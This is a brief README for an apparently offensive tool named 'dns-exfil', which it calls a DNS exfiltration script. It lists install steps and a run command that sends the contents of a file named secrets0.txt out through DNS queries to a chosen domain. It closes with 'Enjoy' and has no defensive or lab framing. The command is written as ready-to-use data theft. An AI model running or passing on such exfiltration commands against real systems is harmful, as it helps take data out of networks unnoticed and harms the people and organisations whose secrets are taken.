# dns-exfil
A simple DNS exfiltration script.


## Installation
1. `git clone https://github.com/rybolov/dns-exfil.git`
2. `python3 -m venv ./venv`
3. `source ./venv/bin/activate`
4. `pip3 install -r requirements.txt`
4. `python3 ./main.py --file secrets0.txt --type A --domain google.com` 
5. Enjoy